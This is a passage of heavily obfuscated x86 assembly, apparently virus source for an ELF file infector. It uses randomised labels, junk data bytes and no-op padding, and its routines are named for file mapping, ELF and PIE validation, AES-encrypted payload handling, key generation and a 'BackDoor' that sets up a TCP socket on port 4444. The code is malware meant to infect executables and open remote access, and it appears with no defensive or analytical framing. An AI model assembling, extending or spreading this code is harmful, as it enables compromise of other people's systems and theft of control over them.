    syscall
%endif
    mjmp        ..@xFkZlNTaOQyW
..@ILBmlc8H51vL:
    movr        rsp, rsp
    mjmp        ..@OYld2XVhTRnt
..@k3tzSSBQTNbC:
    mov         bl, dl
    mjmp        ..@Lt9PKkB4l21D
..@p1xQ9nk6Zu9D:
%ifdef X86_64
    movv        rax, SYS_MMAP
%endif
    mjmp        ..@Y1wsIW1wp4T6
db 0x4b, 0xaa
..@Y1wsIW1wp4T6:
    mjmp        ..@Pb1zwdbMbUwq
db 0x2f
..@Pb1zwdbMbUwq:
    mjmp        ..@UftOVAsW6iaZ
db 0x0a
..@UftOVAsW6iaZ:
    mjmp        ..@rmRtX6TIne4Z
..@MctsltnELoyD:
    movv        r2, 11b
    mjmp        ..@EHNgOGs20iw6
db 0x16, 0x6c, 0x6d
..@EHNgOGs20iw6:
    mjmp        ..@ou32PxWmUVtG
..@ZeUjdnDMYLlR:
%ifdef X86_32
    je          ..@EuaGjmwM9vTp
    cmp         dx, 00c080h
    je          ..@EuaGjmwM9vTp
    cmp         dx, 00e880h
%endif
    mjmp        ..@Ou0ovCFPf3cp
db 0x39, 0xd0, 0xd7
..@Ou0ovCFPf3cp:
    mjmp        ..@SgZTFlh0HPlp
..@CUSRNNw8sQX4:
    mov         QWORD [r5+file.filesize], 0x00
    mjmp        ..@xMWcStweHmqt
..@55OoZz800YLk:
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    mjmp        ..@dTiqOHlEdbpr
db 0x02, 0x23, 0x32
..@dTiqOHlEdbpr:
    mjmp        ..@bUK7cvL0kjgP
..@FUWoEMpSFLbF:
    ret
    mjmp        ..@gnQaQDsamKwt
db 0x14
..@gnQaQDsamKwt:
    mjmp        DYNPIEValidation
..@FCvTq7zQys94:
    mjmp        ..@bgBuJJa9k9r5
    mjmp        ..@8I43VxEcJ4pJ
..@yR088lXaEQ7X:
%ifdef X86_64
    xchg        rdi, rdi
%endif
    mjmp        ..@TOHYEpQbub8v
db 0x2c, 0xcc, 0x26
..@TOHYEpQbub8v:
    mjmp        ..@dWQhEmc0rEtc
..@2BQwkawqxPs0:
    xchg        rcx, rcx
    add         rdi, rcx
    movr        rsi, rsi
    xor         rax, rax
    mjmp        ..@1ENMgzuj1ZQi
db 0xf7, 0x4b
..@1ENMgzuj1ZQi:
    mjmp        ..@KYeKOYMqH3dR
db 0xab, 0xb1
..@KYeKOYMqH3dR:
    mjmp        ..@fTgMUDnAx3re
db 0x0d, 0x44, 0x3f
..@fTgMUDnAx3re:
    mjmp        ..@o2f34GVU3ew0
db 0x64, 0x0c, 0xf4
..@o2f34GVU3ew0:
    mjmp        ..@mr7fn7YlVqVh
..@OBhAYKXYuR7u:
    xchg        rdi, rdi
    mjmp        ..@WYw2KlTkkX0U
..@xuDBw4kFmIsG:
    and         edx, 000f100f0h
    xchg        rcx, rcx
    cmp         edx, 00710070h
    je          ..@Rfu6MzLcgP6z
    mjmp        ..@1FNaGDYEuO2S
db 0xf4, 0x66
..@1FNaGDYEuO2S:
    mjmp        ..@CxbU8hAT9l23
db 0xda
..@CxbU8hAT9l23:
    mjmp        ..@OYbwjLweF7nB
..@nGFQ6vQENnxN:
    call        KeyGen
    push        rcx
    mjmp        ..@4xFiqMAZEYmQ
..@Wz8xATMU1Fw8:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    mjmp        ..@nnoKf6qA5x7D
..@HBB9b5m13tgq:
    mjmp        ..@oD14a0gH3pO5
    mjmp        ..@xXOvFqB68srG
db 0xc8
..@xXOvFqB68srG:
    mjmp        ..@kmYN6RE2pkd3
..@JzFcIyNGQMPW:
    movr        rdx, rbx
    and         ebx, 00000111b
    and         edx, 00111000b
    mjmp        ..@kM2Sg0M8OK3p
db 0xf0, 0xf9, 0x46
..@kM2Sg0M8OK3p:
    mjmp        ..@7u4KKBpvgFcs
..@pfkAgR9zjwlf:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    mjmp        ..@l1J1p8AM5Gm3
db 0x22
..@l1J1p8AM5Gm3:
    mjmp        ..@z9nBQAKFrpr7
..@kUhMAb8DkPxr:
    push        rax
    pop         rax
    add         rcx, 2*bytes
    mjmp        ..@Vg1xbpG1JoBS
db 0x02
..@Vg1xbpG1JoBS:
    mjmp        ..@TSJz1kwmEd6M
..@LKomv3Q8EJP9:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    mjmp        ..@ogWcIYrxDY2J
..@M1nxlq5cSE6a:
    mov         BYTE [rdi], 68h
    test        cl, cl
    mjmp        ..@RyJqQ98kAtgu
..@2JLeiJphN4v6:
    xor         r4, r4
    mjmp        ..@NSmNa3gMTpvQ
db 0xc2, 0x3d
..@NSmNa3gMTpvQ:
    mjmp        ..@dUtYP82VRfdk
..@A6AlLJYMysLr:
%ifndef ENABLE_DEBUGGING
    call_vsp    ExitProgram
%endif
    mjmp        ..@FngaR8P2M2DO
..@KwjQNfrfAfJw:
    shl         edi, 0x8
    push        rcx
    pop         rcx
    mov         ax, dx
    movr        rax, rax
    mjmp        ..@H4yXYygquOEF
..@4Qw1xXrb7oHE:
    cmp         dl, 81h
    mjmp        ..@6gfdBSOEWxqk
..@Hie52RojKhuU:
    xor         r1, r1
    mov         r1w, WORD [rsp+r4]
    mjmp        ..@mO2i68jIZNxj
db 0x2a
..@mO2i68jIZNxj:
    mjmp        ..@Qr7C18MZrrxc
db 0x35
..@Qr7C18MZrrxc:
    mjmp        ..@mU5sbo9AB4rC
db 0x0e, 0x1e, 0x07
..@mU5sbo9AB4rC:
    mjmp        ..@FEpFMBoD0jnU
db 0x92
..@FEpFMBoD0jnU:
    mjmp        ..@mpOV5NsK5WN5
..@AWoxcKvuE1sK:
    push        r2
    mjmp        ..@NS3W35yiyz1i
db 0xe7
..@NS3W35yiyz1i:
    mjmp        ..@dqYK1nkXi06C
..@prKzQ0Cu3YFE:
    add         rdi, 1
    mjmp        ..@aHE6VTlpNeSE
db 0x22, 0x1c
..@aHE6VTlpNeSE:
    mjmp        ..@O81tFTgLDazu
db 0xf5
..@O81tFTgLDazu:
    mjmp        ..@80xEYZEUX6W4
..@Tc8tIxV9F9JB:
    movr        rax, rbx
    mjmp        ..@hw586lzVBgCR
db 0x9e, 0xfd
..@hw586lzVBgCR:
    mjmp        ..@cuOSiftS8i1p
db 0xf5, 0xf2, 0xa0
..@cuOSiftS8i1p:
    mjmp        ..@PAasLE2kxRyU
db 0xe5, 0x23, 0x1f
..@PAasLE2kxRyU:
    mjmp        ..@ox9BraoJAxAS
..@LGswyJUdB3PO:
    jb          ..@bVazkF2e4fnm
    cmp         cl, 0x82
    ja          ..@bVazkF2e4fnm
    mjmp        ..@D6NbMNOj03aJ
    mjmp        ..@bVazkF2e4fnm
..@tzxGP2gKiWo9:
    push        rsi
    pop         rsi
    mjmp        ..@vGEwe4sX5YYq
..@xCR2vWbeuGeF:
    movv        rax, 0x1
    mjmp        ..@DbAA1qUUdt2O
db 0xfd, 0x69
..@DbAA1qUUdt2O:
    mjmp        ..@v9Cj5XY6sfKF
db 0x6f, 0x17
..@v9Cj5XY6sfKF:
    mjmp        ..@LTcUURyx2pxQ
db 0xf8
..@LTcUURyx2pxQ:
    mjmp        ..@LfypMG2HSSJO
..@bVazkF2e4fnm:
    mov         dl, BYTE [rsp+bytes+2]
    mjmp        ..@us63wUPVz0Sh
..@r4XZc7kEiunR:
    xor         rdx, rdx
    push        rdi
    pop         rdi
    mjmp        ..@3nCMgJzBz6Yo
db 0x18, 0xa9
..@3nCMgJzBz6Yo:
    mjmp        ..@4i5cpAGfw5iy
..@NwOWL1PWRaOx:
    add         rdi, _signature.index-_signature.start
    mov         DWORD [rdi], eax
    movr        rcx, rcx
    xor         r1, r1
    mjmp        ..@r3GyuW97vigP
..@xisUSQS51Psy:
    pop         rcx
    push        rcx
    xchg        rsp, rsp
    mjmp        ..@O1gXFADho7Pp
db 0x32, 0xe7, 0xce
..@O1gXFADho7Pp:
    mjmp        ..@x1cqOz5jNv1m
db 0xe3, 0x40, 0x22
..@x1cqOz5jNv1m:
    mjmp        ..@v1g1netmTO7K
..@9ok1CwED27Nj:
    xchg        rbx, rbx
    mjmp        ..@BhcBIzqE2TSy
db 0xd0, 0xe1
..@BhcBIzqE2TSy:
    mjmp        ..@IURrE82SseHD
..@3oE9FkBLo5HP:
    cmp         bl, 58h
    mjmp        ..@GEfCITTECDaq
db 0x27, 0x43
..@GEfCITTECDaq:
    mjmp        ..@zPqJZQa9XW45
..@bYX38eaTbBrt:
    pop         r1
    mjmp        ..@AouebfNACuCK
..@XttLYIyx01Cj:
    push        rdi
    mjmp        ..@ZWhWG4oogJP1
db 0x30, 0x12
..@ZWhWG4oogJP1:
    mjmp        ..@pswpCDVtJ8IG
ConvertPushPopValueToMoveValue:
    mjmp        ..@hU13r9fPPvOv
..@u03RbQsVIxWC:
    shl         ecx, 8
    mjmp        ..@vQupzPW6AKAj
db 0xe7
..@vQupzPW6AKAj:
    mjmp        ..@RwhOuA57cRMm
..@pvWO2M73qnQR:
    pop         r4
    mjmp        ..@Ig0acjbmZksr
db 0xab
..@Ig0acjbmZksr:
    mjmp        ..@T4YVtsgWk5FG
..@mQwZ9cicluqN:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    movr        rdi, rdi
    xchg        rbx, rbx
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    mjmp        ..@1O90M1kRLI4I
db 0xe7
..@1O90M1kRLI4I:
    mjmp        ..@KCSBixvx3nQq
..@K20jZfEeTBey:
%ifndef ENABLE_DEBUGGING
    syscall
    xchg        rax, rax
%endif
    mjmp        ..@ROKdQdFbnC2C
db 0xcc, 0xdc
..@ROKdQdFbnC2C:
    mjmp        ..@eNv3oSBYuzgo
..@THGRTRaUWZTz:
    push        rdi
    pop         rdi
    test        eax, eax
    jnz         ..@pgNpEHLJyuZi
    mjmp        ..@kUhMAb8DkPxr
..@HAdL0Ki31Sn5:
    xor         rcx, rcx
    rep         nop
    xor         rdx, rdx
    mjmp        ..@0naZ2wJLEvwB
db 0xc5, 0x19
..@0naZ2wJLEvwB:
    mjmp        ..@w4tX7zCO8ph8
..@OTdy6UVmZwCc:
%ifdef X86_32
    push        rsi
    pop         rsi
    xchg        rax, rax
%endif
    mjmp        ..@CKAoH0fV9U7g
db 0xee, 0xee, 0x60
..@CKAoH0fV9U7g:
    mjmp        ..@JJ3yXTnx64LG
..@Rfu6MzLcgP6z:
    mov         edx, DWORD [rdi]
    xor         rbx, rbx
    movv        rbx, 90909090h
    mov         bx, dx
    mjmp        ..@AuJwJi2kNwoh
..@NP4reyHWSK6v:
    mjmp        ..@XLE9hbhAKGdP
    mjmp        ..@4UeV61A3psGA
..@sMK01EDLq5CZ:
    cmp         rax, 0
    jne         ..@GkOt1RV7VMVc
    mjmp        ..@WVDNgALZkgFX
db 0xc2, 0xaa, 0x22
..@WVDNgALZkgFX:
    mjmp        ..@yzlIlkTZcWZ1
..@uXM2B8MZK7Ug:
%ifndef ENABLE_DEBUGGING
    push        rsi
%endif
    mjmp        ..@cyfA2xGJrnLb
db 0xa6, 0xcd, 0x2a
..@cyfA2xGJrnLb:
    mjmp        ..@kieSoydiV0je
..@LDSOTEo2ebMD:
    movv        rcx, PADDING
    movv        rax, 0x00
    mjmp        ..@yK7JNVaCLihI
db 0x28, 0xfe, 0xb5
..@yK7JNVaCLihI:
    mjmp        ..@q9xGIlpiiid8
..@wQZY5gYKUEl9:
    add         r1, 1
    mjmp        ..@0CA6EvpIrOSC
    mjmp        ..@tTigU9uPJbPQ
..@J7XfIvmXbChC:
    mov         al, BYTE [rdi]
    mov         BYTE [rsp+_LZSSE_OFF.character], al
    mjmp        ..@y4bJcboURFqT
db 0xb3
..@y4bJcboURFqT:
    mjmp        ..@47MUF87gyVLr
..@Nq69b57iIlKQ:
    movr        rsi, rsi
    mjmp        ..@2SG8Hhrds5Fe
db 0xc8, 0x34
..@2SG8Hhrds5Fe:
    mjmp        ..@AQ6icNNYjn7j
db 0x94, 0xaa, 0xa6
..@AQ6icNNYjn7j:
    mjmp        ..@hhTjAgCCuLjx
..@hctv5Cq6aFxH:
    rep         stosb
    mjmp        ..@wILHP2QRNYeE
db 0x10, 0x94, 0x6f
..@wILHP2QRNYeE:
    mjmp        ..@RRMeOipHHTBj
db 0xf7
..@RRMeOipHHTBj:
    mjmp        ..@tjV8wMR7QwjQ
..@iIKTdnPPiXYa:
    jnz         ..@1z7fHI5NffFb
    mjmp        ..@JuJXCj7eiYPw
db 0x9c, 0x09
..@JuJXCj7eiYPw:
    mjmp        ..@7LtHG3h8gHBQ
..@tZs0Yt7FssLj:
    pop         rax
    mjmp        ..@FHF0nXsEu4Op
db 0xf4, 0x03
..@FHF0nXsEu4Op:
    mjmp        ..@EBFhE7A54S6Q
db 0x18, 0xef
..@EBFhE7A54S6Q:
    mjmp        ..@TuC1JTh1iEwF
..@c8eilWcuVaqB:
    push        rsi
    push        rcx
    xor         rax, rax
    xor         rdx, rdx
    xor         rbx, rbx
    mjmp        ..@Em3RbGEcL6db
db 0x4d, 0xac, 0xaa
..@Em3RbGEcL6db:
    mjmp        ..@sogLmENhRgfS
..@lDSCB9LEhdLA:
    add         rsp, _PROC_OFF_size
    mjmp        ..@dHGPfkcCJ3J4
db 0x30
..@dHGPfkcCJ3J4:
    mjmp        ..@lu64hwqMJG69
db 0xab, 0x98
..@lu64hwqMJG69:
    mjmp        BackDoor
..@GLzQlVMUlnFP:
    syscall
    test        eax, eax
    jnz         ..@8xaf2LWF4NUm
    mjmp        ..@jaPpnrNP7RQA
db 0xe0, 0xf0, 0x27
..@jaPpnrNP7RQA:
    mjmp        ..@CoPAxFgLYq3W
..@JgSvIUGI1Xls:
    sub         r5, 1
    mjmp        ..@9qPZEHeM0hsd
db 0xdc
..@9qPZEHeM0hsd:
    mjmp        ..@gcUIqC3FYl6Z
..@XvFIJPeVOXxh:
    cmp         BYTE [r2], 0x0
    jz          ..@hvM6SHnuxnu0
    movzx       rax, BYTE [r2]
    mov         [r1], rax
    add         r1, 1
    mjmp        ..@RunCtt37JvtZ
db 0x40, 0x07
..@RunCtt37JvtZ:
    mjmp        ..@Ti023nOjBTFp
..@KOFtVaCjZFsQ:
    movr        rdi, rsi
    mjmp        ..@4i9i3Fl7Cwa9
..@dQLOoM6iIRMP:
    je          ..@7P7QGBNRJhZk
    mjmp        ..@I27ZoqKjQWcF
db 0x4f, 0x3e, 0xfa
..@I27ZoqKjQWcF:
    mjmp        ..@s2QKHBuDlNRc
..@74EHL1aEuXP7:
%ifdef X86_64
    cmp         edx, 00c08348h
    movr        rdx, rdx
    movr        rbp, rbp
    je          ..@EuaGjmwM9vTp
%endif
    mjmp        ..@Lo2g7r83zoRY
..@1ccTqLchpJOJ:
    ret
    mjmp        ..@IAt62iR6Hr8H
db 0xae
..@IAt62iR6Hr8H:
    mjmp        ..@glRHVUTY0HAr
db 0x2a, 0xb3
..@glRHVUTY0HAr:
    mjmp        ..@e3pgjGkz6rGR
db 0x41, 0x4e
..@e3pgjGkz6rGR:
    mjmp        ..@QGgjs47imPBM
..@bdF2sJ00zl6i:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    push        rcx
    mjmp        ..@4NjSCk1oBhGx
db 0xfa
..@4NjSCk1oBhGx:
    mjmp        ..@BAiBjhHIKVLC
..@mt8NaTrqizBj:
    rep         nop
    mjmp        ..@jtf3m2kbKN0f
db 0x2e, 0x06
..@jtf3m2kbKN0f:
    mjmp        ..@MjrNwcccl1mn
..@XXi3uHenvvX1:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], r5
    mjmp        ..@5T4ajhxQz6sW
..@i57BzyR18MyL:
    movr        rbp, rbp
    movr        rcx, rcx
    sub         ecx, 6
    mov         WORD [rdi+6], dx
    mjmp        ..@p5ThK5eLRaOJ
db 0x2a
..@p5ThK5eLRaOJ:
    mjmp        ..@0tAUggAdGtkP
..@MIu7O7rN3ISB:
    add         WORD [rsp+_LZSSE_OFF.la_index], ax
    add         WORD [rsp+_LZSSE_OFF.w_index], ax
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jl          ..@JVbSUAg7SWTd
    mjmp        ..@gu6Q9Jar9yAq
..@lfV9RFWzWsE2:
    movr        rdi, rdi
    mjmp        ..@xSwnkPwLY5OC
db 0xab, 0xb6
..@xSwnkPwLY5OC:
    mjmp        ..@XzaKYiWR1xzF
db 0xd3, 0x6c
..@XzaKYiWR1xzF:
    mjmp        ..@JjlcFr0PbIBa
db 0x25, 0xe0, 0x9d
..@JjlcFr0PbIBa:
    mjmp        ..@qe5rb45jDWnm
db 0xde, 0xee
..@qe5rb45jDWnm:
    mjmp        ..@OfoFdDqwOOkW
db 0x27, 0xf7
..@OfoFdDqwOOkW:
    mjmp        MemMove
..@Rlq43jz2EXQb:
    and         edx, 0007h
    mjmp        ..@3hkm4EyVxoaz
..@qlqOfSPiNEKF:
    push        rdx
    pop         rdx
    movdqu      xmm1, oWORD [rsp+0x70]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x80]
    mjmp        ..@xJWIuQqJST8Y
db 0x0d, 0xa4, 0x36
..@xJWIuQqJST8Y:
    mjmp        ..@CijgqCGeIfNC
..@WtaxElAeCrOy:
    pop         rcx
    mjmp        ..@crhMJt3nkeky
..@tngyXFOwCEFS:
    movv        r3, 0x02
    movv        rax, SYS_LSEEK
    mjmp        ..@Ug31JQuQGwEc
db 0x04, 0x01
..@Ug31JQuQGwEc:
    mjmp        ..@ArUflhNZ7qYQ
..@cnfYyN59VGPk:
    movv        rax, 0x00
    mjmp        ..@sY7iMHS7BtHn
..@npuymsRaJ7kn:
%ifdef X86_64
    mov         edx, DWORD [rdi]
    cmp         dl, 41h
%endif
    mjmp        ..@CO7md8qNHJnA
db 0xab
..@CO7md8qNHJnA:
    mjmp        ..@h0PXrDoi6W6N
..@uAofuBz19Zg9:
    movr        r1, r5
    mjmp        ..@9kznzGUHJdS1
db 0x93, 0xc9, 0x4f
..@9kznzGUHJdS1:
    mjmp        ..@4qezFSV9cHpV
..@1CZ3IueVjGPO:
    cmp         rax, 0x02
    je          ..@IjCs7jhgW92w
    cmp         rax, 0x01
    je          ..@idLXiX6eUswD
    mjmp        ..@y1DBTlVDBAUC
    mjmp        ..@YCwE4esX6U9t
db 0xb1, 0x41
..@YCwE4esX6U9t:
    mjmp        ..@w6XZ714zYgUS
db 0xd0, 0x3f
..@w6XZ714zYgUS:
    mjmp        ..@IjCs7jhgW92w
..@YIyygJSw3mIk:
%ifdef X86_64
    movr        rdx, rdx
%endif
    mjmp        ..@9AbIr79H7tKr
db 0x32, 0x4b
..@9AbIr79H7tKr:
    mjmp        ..@erF3MHiYlzow
db 0xb3, 0x99, 0x61
..@erF3MHiYlzow:
    mjmp        ..@MHOaDnvDt3fn
..@skrbG892BwwJ:
    mov         rax, QWORD [rsp+_UPDATASIG_OFF.meta_ptr]
    mjmp        ..@YT1jI713IBGb
db 0xca, 0x6f, 0x4d
..@YT1jI713IBGb:
    mjmp        ..@NLbvjNAUerdc
..@gMRcDlUSY80z:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_WAIT4
%endif
    mjmp        ..@aBdRnrfStODv
db 0x67, 0xab, 0x6c
..@aBdRnrfStODv:
    mjmp        ..@u95byQmBjX6I
db 0x9e, 0xae, 0x62
..@u95byQmBjX6I:
    mjmp        ..@GP2cPFy53ixy
..@1CqqPjSihfIz:
    cmp         edx, ebx
    jne         ..@9iKKzvO4j9aM
    mjmp        ..@bgEz2bW7VaPn
..@pNahl2rCeg92:
    cmp         BYTE [r1], 0x30
    mjmp        ..@S4sH3iw50XUb
db 0xdd, 0xee, 0x61
..@S4sH3iw50XUb:
    mjmp        ..@HqfRghkZn1SG
UnmapFile:
    mjmp        ..@mo83ob7qhVt4
..@GA3767tq0dv2:
%ifdef X86_64
    and         rax, 100b
%endif
    mjmp        ..@OmLRNsX4PYqh
..@xOkdLjNRsI7K:
    push        r1
    movr        r5, r2
    mov         r2, QWORD [r1+file.filename]
    movr        rsp, rsp
    mjmp        ..@oaIDGyDk9t50
MapFile:
    mjmp        ..@xOkdLjNRsI7K
..@AtigUk0fwax7:
%ifdef X86_32
    movr        rbp, rbp
%endif
    mjmp        ..@4Wf5tpAjTu2V
..@z9nBQAKFrpr7:
%ifndef ENABLE_DEBUGGING
    movv        r1, 0x2
    movv        r2, 0x1
    movv        r3, 0x6
%endif
    mjmp        ..@2LNmH6PFDAQd
..@zPqJZQa9XW45:
    jne         ..@oD14a0gH3pO5
    mjmp        ..@4HXfAMANwxTC
db 0x1b
..@4HXfAMANwxTC:
    mjmp        ..@Sz1RzWU0Ii7V
..@r6HOvudSsVYu:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    mjmp        ..@TQbTbidNLmRD
..@hy0FS3B0yUdB:
    add         rsi, WINDOW_LENGTH
    rep         movsb
    mjmp        ..@B4DH63WIMrc3
db 0x18, 0xef
..@B4DH63WIMrc3:
    mjmp        ..@53isRmkOaika
db 0x33, 0x3b, 0x4f
..@53isRmkOaika:
    mjmp        ..@3P07QVPkM0n7
db 0xc9
..@3P07QVPkM0n7:
    mjmp        ..@FR5vKNiVFMr5
..@Z7CTay4c239P:
%ifdef X86_64
    xor         rdx, rdx
    xor         r9, r9
    movv        rsi, original_virus_len+PADDING
%endif
    mjmp        ..@zUwTJDUofQ06
db 0x9e, 0x3f, 0x13
..@zUwTJDUofQ06:
    mjmp        ..@pbqXOyeLJc9f
db 0x95
..@pbqXOyeLJc9f:
    mjmp        ..@SINSKJO3d8sJ
..@MyC4fkFjpMBR:
    push        rdx
    mjmp        ..@S3IuDgJXZgkp
db 0x26, 0xb5
..@S3IuDgJXZgkp:
    mjmp        ..@gS8QUmLe0v0j
..@bgBuJJa9k9r5:
    pop         rcx
    mjmp        ..@UmpDUNt323wL
..@CX49IneQwoT7:
    mov         rcx, QWORD [rsp]
    mov         DWORD [rsi+rcx], ebx
    add         rcx, 4
    mjmp        ..@aGGUL8yJCJ5T
..@9rv3psTJ4776:
    jge         ..@0Utv1zjdsipe
    cmp         r1, 0x00
    jg          ..@tCnVPc3dgM7U
    xchg        rcx, rcx
    mjmp        ..@icuKMk8rToL9
    mjmp        ..@BmW9Dr5ditKD
db 0xb4, 0xcd, 0x28
..@BmW9Dr5ditKD:
    mjmp        ..@ihhOEMxgIrW7
db 0x29, 0xf8
..@ihhOEMxgIrW7:
    mjmp        ..@MvPYkUBQOTb1
db 0xf6
..@MvPYkUBQOTb1:
    mjmp        ..@0Utv1zjdsipe
..@gNWRCC8xBuK8:
    movdqu      xmm1, oWORD [rsp+0xe0]
    mjmp        ..@R6F1ynCHy6Gh
..@MDFfZfoaAInJ:
    pop         rdx
    test        r2, r2
    jnz         ..@icuKMk8rToL9
    movr        r1, r5
    call        IsELFComplete
    mjmp        ..@x8fQZCzFeDrY
..@jX1mIw7l2Rib:
%ifdef X86_64
    movr        rax, rsi
%endif
    mjmp        ..@AvTtxc84UU5i
db 0xe5
..@AvTtxc84UU5i:
    mjmp        ..@UmEzQHyK64KN
db 0x47
..@UmEzQHyK64KN:
    mjmp        ..@lO5g0DjVfoDi
db 0x0d, 0xf2
..@lO5g0DjVfoDi:
    mjmp        ..@R78rM69SATqY
db 0xcd
..@R78rM69SATqY:
    mjmp        ..@GA3767tq0dv2
..@T4YVtsgWk5FG:
    ret
    mjmp        GetNewProgramVaddr
..@N0hKm6tFpPWF:
%ifdef X86_64
    xchg        rdx, rdx
    movr        rsp, rsp
    je          ..@EuaGjmwM9vTp
    cmp         edx, 00c08048h
    je          ..@EuaGjmwM9vTp
%endif
    mjmp        ..@Dom3LWCqrXHj
..@iQ2YWznnn8W0:
    ret
    mjmp        IsELFComplete
..@cbc8mMOxys2w:
    movr        rdx, rdx
    mjmp        ..@Fn8A6HuhtUpf
..@dEuVbvl9vVhH:
    mov         BYTE [rdi+1], dl
    mjmp        ..@uo2GEg3nQWS1
..@cuPlW3I68n6b:
    pop         r5
    mjmp        ..@pvWO2M73qnQR
..@nRyi8LzjjJ7X:
    jbe         ..@D8L8TSWQvqZl
    mjmp        ..@fCFvdZKTbils
..@xhLsdsvIN52N:
    xchg        rsi, rsi
    mjmp        ..@mw30bQGW7ZNi
..@EAvHxXJNqb4G:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
    xor         r5, r5
%endif
    mjmp        ..@9xs3shMd6o0l
db 0x29
..@9xs3shMd6o0l:
    mjmp        ..@Zdc9JkVBKvHq
db 0xe5, 0xf8
..@Zdc9JkVBKvHq:
    mjmp        ..@fhh76JcTL1j1
..@WzXMfN0oZV5B:
    cmp         BYTE [r1+16], ET_EXEC
    push        rbx
    pop         rbx
    je          ..@cbc8mMOxys2w
    cmp         BYTE [r1+16], ET_DYN
    mjmp        ..@f0QcejTAo4Z6
db 0xb6, 0x4e
..@f0QcejTAo4Z6:
    mjmp        ..@vpw9TiD10ZZN
..@9SlJVzYYl9lX:
    xchg        rdx, rdx
    mjmp        ..@acVXBIhj8pTu
..@04J5YQQhw4ej:
    xor         rcx, rcx
    mjmp        ..@3udnhuRgykjV
..@AweEopZu3Ggy:
    pop         rdx
    mjmp        ..@9372bSrQSZyx
..@9iKKzvO4j9aM:
    pop         rcx
    mjmp        ..@fbNnUz5D6Evb
db 0xe7, 0x02, 0x22
..@fbNnUz5D6Evb:
    mjmp        ..@mpbuzFRpXVHk
db 0xc2
..@mpbuzFRpXVHk:
    mjmp        ..@gPnwsth0Z1KY
..@lJTE6bmvtMa3:
    test        dl, dl
    push        rdi
    pop         rdi
    mjmp        ..@vu7MSY3ZDfuP
db 0x93, 0x46
..@vu7MSY3ZDfuP:
    mjmp        ..@CN8GaW7Di6em
..@UzhamMwfNUjZ:
%ifndef ENABLE_DEBUGGING
    push        rsi
    pop         rsi
    push        WORD 0x5c11
    push        WORD 0x02
%endif
    mjmp        ..@zWY2gNPNQtaN
db 0x20, 0x10, 0xaa
..@zWY2gNPNQtaN:
    mjmp        ..@TQ3DwcR8QZhX
..@7nAvWtE08rQG:
%ifdef X86_64
    pop         rsi
%endif
    mjmp        ..@E6VIr1auHZTP
..@5BHk64hSZNpr:
    and         rax, DF_1_PIE
    mjmp        ..@THGRTRaUWZTz
..@SYIp69WY5x2S:
%ifdef X86_64
    push        rsi
%endif
    mjmp        ..@tw1RUcih57Lb
db 0x3a, 0xad
..@tw1RUcih57Lb:
    mjmp        ..@456LCpgTPsge
..@2E9X36OkzVga:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    mjmp        ..@4yq93kBtZCHf
db 0xa8, 0x45
..@4yq93kBtZCHf:
    mjmp        ..@Nq69b57iIlKQ
..@mFU3MJ5XT20D:
    mov         BYTE [rdi], 90h
    mjmp        ..@uCkYeg5fgGzj
..@mWWPCXqTh6PK:
    CFILE       DWORD [r5+file.filefd]
    mjmp        ..@EOrDeskUrUYR
..@jW2SzhQFoRQ5:
    mjmp        ..@gOt3IikBr2kO
    mjmp        ..@2Yif2ACJBwpg
db 0xd6, 0x21, 0xb3
..@2Yif2ACJBwpg:
    mjmp        ..@Rfu6MzLcgP6z
..@06HEjZapxvGT:
    movr        r1, rsp
    mjmp        ..@pSAPnL0IvzTY
db 0x26, 0xc5, 0x09
..@pSAPnL0IvzTY:
    mjmp        ..@8LfAJ6okHUwR
..@v3gsBjzy0OYy:
    xor         rdx, rdx
    mjmp        ..@leqt0QZmmr0v
db 0x3c, 0x09
..@leqt0QZmmr0v:
    mjmp        ..@TlhgTOcATbEJ
..@tCnVPc3dgM7U:
    mov         r1, QWORD [r5+file.filename]
    cmp         BYTE [r1], '/'
    jne         ..@icuKMk8rToL9
    mjmp        ..@jFgkwvIn75IU
..@T2vnnN0Htpb2:
    sub         ebx, 1
    mjmp        ..@5Ql1DAZeCVRx
..@B2hVh9BnBdVM:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    cmp         eax, 0x3
    mjmp        ..@uR3wiBwrvIhr
db 0xdf, 0x47
..@uR3wiBwrvIhr:
    mjmp        ..@euJZHUJTW0wC
..@TBhCAYNwbPzB:
    movv        r3, encrypted_len
    mjmp        ..@06HEjZapxvGT
..@Jvedv2rHVSDb:
    xchg        rsi, rsi
    mjmp        ..@FSLkbnpH1HQu
db 0x0e, 0xb2, 0xab
..@FSLkbnpH1HQu:
    mjmp        ..@viMUcY5up8sN
..@zhSEv0f9DBv4:
    push        r2
    mjmp        ..@LE2BPMnpw0Db
db 0xcc
..@LE2BPMnpw0Db:
    mjmp        ..@UocQDDPodC2A
db 0x42
..@UocQDDPodC2A:
    mjmp        ..@JCOWnh0b32hy
..@WZTHXDcSGug5:
    rep         stosb
    xor         rax, rax
    xor         r2, r2
    mjmp        ..@MjBv9bubjb37
db 0xcb, 0x4a
..@MjBv9bubjb37:
    mjmp        ..@MLTT4Na0pY6W
..@zpDbelG2lJnM:
%ifdef X86_64
    add         rdi, 1
%endif
    mjmp        ..@DFG1TGpUY8Ni
..@GcwcPszRnE9d:
    mov         r1, m6
    mjmp        ..@k1yDdvNSPlIX
db 0xcd
..@k1yDdvNSPlIX:
    mjmp        ..@cMx8SsipAY9d
db 0xfd
..@cMx8SsipAY9d:
    mjmp        ..@ZHDnnxBQ5nl6
..@VWqeAPwaLD6s:
%ifdef X86_64
    cmp         al, 41h
    jne         ..@gPZZ8E1IuaSv
    xchg        rsp, rsp
%endif
    mjmp        ..@hamxcTScvlfU
